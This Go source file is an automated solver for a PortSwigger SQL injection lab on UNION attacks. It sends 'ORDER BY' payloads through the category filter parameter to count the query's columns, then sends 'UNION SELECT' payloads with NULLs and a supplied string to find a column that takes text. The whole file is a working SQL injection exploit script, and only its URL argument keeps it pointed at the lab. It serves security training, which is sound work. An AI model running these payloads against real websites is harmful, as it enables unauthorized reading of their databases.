package main

// lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text#

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
)

const (
	uriPath                  = "/filter?category=Gifts"
	payloadToGetNumOfColumns = "'+ORDER+BY+{}--"
	payloadWithUNION         = "'+UNION+SELECT+{}--"
	maxColumnSearch          = 100 // Limit search to prevent infinite loops
)

// Config holds application configuration
type Config struct {
	LabURL   string
	labKey   string
	ProxyURL string
}

// SQLInjectionTester handles SQL injection testing operations
type SQLInjectionTester struct {
	client    *http.Client
	targetURL string
}

func main() {
	config := parseArgs()
	tester := newSQLInjectionTester(config)

	fmt.Println("[+] Starting SQL injection test")

	numOfColumns, err := tester.findNumOfColumns()
	if err != nil {
		exitWithError("Attack failed", err)
	}

	success, err := tester.verifyUNIONAttack(numOfColumns, config.labKey)
	if err != nil {
		exitWithError("Verification failed", err)
	}

	if success {
		fmt.Println("[+] SQL injection successful!")
	} else {
		fmt.Println("[-] SQL injection unsuccessful")
	}
}

func parseArgs() Config {
	config := Config{}

	flag.StringVar(&config.LabURL, "u", "", "Root URL of the PortSwigger Lab")
	flag.StringVar(&config.labKey, "k", "", "Lab key")
	flag.StringVar(&config.ProxyURL, "proxy", "", "Proxy URL if wanted")
	flag.Parse()

	flag.Parse()

	if config.LabURL == "" || config.labKey == "" {
		fmt.Println("[-] The lab URL must be provided")
		fmt.Println("[-] The lab key must be provided")
		fmt.Println("[-] Usage: -u <uri> -k <key> [--proxy <proxyURL>]")
		os.Exit(1)
	}

	return config
}

func exitWithError(message string, err error) {
	fmt.Printf("[-] %s: %v\n", message, err)
	os.Exit(1)
}

func newSQLInjectionTester(config Config) *SQLInjectionTester {
	normalizedURL := normalizeURL(config.LabURL)
	client := newHTTPClient(config.ProxyURL)

	return &SQLInjectionTester{
		client:    client,
		targetURL: normalizedURL,
	}
}
func normalizeURL(labURL string) string {
	// Ensure URL has proper protocol prefix
	if !strings.HasPrefix(labURL, "http://") && !strings.HasPrefix(labURL, "https://") {
		labURL = "http://" + labURL
	}

	// Remove trailing slash if present
	return strings.TrimSuffix(labURL, "/")
}

func newHTTPClient(proxyURL string) *http.Client {
	transport := &http.Transport{}

	if proxyURL != "" {
		proxyURLParsed, err := url.Parse(proxyURL)
		if err != nil {
			exitWithError("Error parsing proxy URL", err)
		}
		transport.Proxy = http.ProxyURL(proxyURLParsed)
	}

	return &http.Client{Transport: transport}
}

func (t *SQLInjectionTester) makeRequest(urlWithPayload string) (*http.Response, error) {
	fmt.Printf("[+] Sending request: %q\n", urlWithPayload)

	req, err := http.NewRequest(http.MethodGet, urlWithPayload, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}

	return t.client.Do(req)
}

func (t *SQLInjectionTester) findNumOfColumns() (int, error) {
	baseURL := t.targetURL + uriPath

	for col := 1; col <= maxColumnSearch; col++ {
		payload := strings.Replace(payloadToGetNumOfColumns, "{}", strconv.Itoa(col), 1)
		urlWithPayload := baseURL + payload

		resp, err := t.makeRequest(urlWithPayload)
		if err != nil {
			return 0, fmt.Errorf("error during HTTP request: %w", err)
		}

		defer safeClose(resp.Body)

		if resp.StatusCode == http.StatusInternalServerError {
			correctNumOfColumns := col -1
			fmt.Printf("[+] The correct number of columns is <%d>\n", correctNumOfColumns)
			return correctNumOfColumns, nil
		}
	}

	return 0, errors.New("failed to determine number of columns within search limit")
}

func (t *SQLInjectionTester) verifyUNIONAttack(numOfColumns int, labKey string) (bool, error) {
	for i := range numOfColumns {
		payload, err := generateUNIONPayload(numOfColumns, i, labKey)

		if err != nil {
			return false, err
		}

		isSucces, err := t.performSQLAttack(payload)
		if err != nil {
			return false, err
		}

		if isSucces {
			return true, nil
		}
	}

	return false, nil
}

func generateUNIONPayload(numOfNulls int, keyIndex int, labKey string) (string, error) {
	if numOfNulls < 1 || keyIndex < 0 {
		return "", fmt.Errorf("invalid arguments: numOfNulls must be >= 1 and keyIndex must be >= 0")
	}
	if keyIndex >= numOfNulls {
		return "", fmt.Errorf("invalid arguments: keyIndex can not be greater than the numOfNulls")
	}

	values := make([]string, numOfNulls)
	for i := range values {
		if i == keyIndex {
			values[i] = "'" + labKey + "'"
		} else {
			values[i] = "NULL"
		}
	}

	payload := strings.Join(values, ",")
	return strings.Replace(payloadWithUNION, "{}", payload, 1), nil
}

func (t *SQLInjectionTester) performSQLAttack(payload string) (bool, error) {
	fullURL := t.targetURL + uriPath + payload

	resp, err := t.makeRequest(fullURL)
	if err != nil {
		return false, fmt.Errorf("error sending verification request: %w", err)
	}
	defer safeClose(resp.Body)

	// Check if verification was successful
	if resp.StatusCode == http.StatusOK {
		fmt.Printf("[+] Status code is as expected: %d\n", resp.StatusCode)
		return true, nil
	}

	fmt.Printf("[-] Unexpected status code: got %d, expected %d\n", resp.StatusCode, http.StatusOK)
	return false, nil
}

func safeClose(closer io.Closer) {
	if err := closer.Close(); err != nil {
		fmt.Printf("[-] Error closing resource: %v\n", err)
	}
}
